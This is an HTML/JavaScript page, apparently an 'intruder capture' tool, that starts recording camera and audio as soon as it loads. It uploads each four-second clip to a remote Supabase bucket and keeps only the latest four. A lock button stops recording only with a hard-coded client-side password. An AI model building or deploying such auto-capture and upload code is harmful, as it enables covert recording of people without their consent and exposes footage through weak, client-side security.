<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Auto Video Recorder</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background: #111;
      color: white;
      font-family: sans-serif;
      margin: 0;
    }
    video {
      width: 300px;
      border: 2px solid white;
      border-radius: 12px;
      margin-bottom: 20px;
    }
    #lock {
      font-size: 32px;
      cursor: pointer;
      position: absolute;
      top: 20px;
      right: 20px;
    }
  </style>
</head>
<body>
  <video id="preview" autoplay muted playsinline></video>
  <div id="lock">üîí</div>

  <!-- Supabase JS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // üîë Apni Supabase details yahan dalen
    const SUPABASE_URL = "https://eizhtvtchspiefxutzlg.supabase.co";
    const SUPABASE_KEY = "PASTE_YOUR_ANON_KEY_HERE"; // Supabase project ke "API" section se
    const BUCKET_NAME = "videos"; 
    const PASSWORD = "1234"; // Apna password set karein

    const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const videoEl = document.getElementById("preview");
    const lockEl = document.getElementById("lock");

    let mediaRecorder, recordedChunks = [];
    let stopEarly = false;

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, 
          audio: true
        });
        videoEl.srcObject = stream;

        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);

        mediaRecorder.onstop = async () => {
          if (stopEarly) return; // Agar lock se stop hua to upload na ho

          const blob = new Blob(recordedChunks, { type: "video/webm" });
          const filename = `video_${Date.now()}.webm`;

          // Upload video
          const { error } = await client.storage
            .from(BUCKET_NAME)
            .upload(filename, blob, {
              contentType: "video/webm",
              upsert: false
            });

          if (error) {
            console.error("Upload error:", error.message);
          } else {
            console.log("‚úÖ Uploaded:", filename);
            await keepOnlyLatestFour();
          }
        };

        mediaRecorder.start();
        setTimeout(() => {
          if (!stopEarly && mediaRecorder.state === "recording") {
            mediaRecorder.stop();
          }
        }, 4000); // 4 seconds
      } catch (err) {
        console.error("Camera error:", err);
      }
    }

    // Sirf latest 4 videos rakhna
    async function keepOnlyLatestFour() {
      const { data, error } = await client.storage
        .from(BUCKET_NAME)
        .list("", { sortBy: { column: "created_at", order: "desc" } });

      if (error) {
        console.error("List error:", error.message);
        return;
      }

      if (data.length > 4) {
        const oldFiles = data.slice(4).map(file => file.name);
        await client.storage.from(BUCKET_NAME).remove(oldFiles);
        console.log("üóë Deleted old files:", oldFiles);
      }
    }

    // Lock button
    lockEl.addEventListener("click", () => {
      const input = prompt("Enter password:");
      if (input === PASSWORD) {
        stopEarly = true;
        if (mediaRecorder && mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }
        alert("‚úÖ Access granted. Recording stopped.");
      } else {
        alert("‚ùå Wrong password! Recording will continue.");
      }
    });

    // Start recording automatically
    startRecording();
  </script>
</body>
</html>
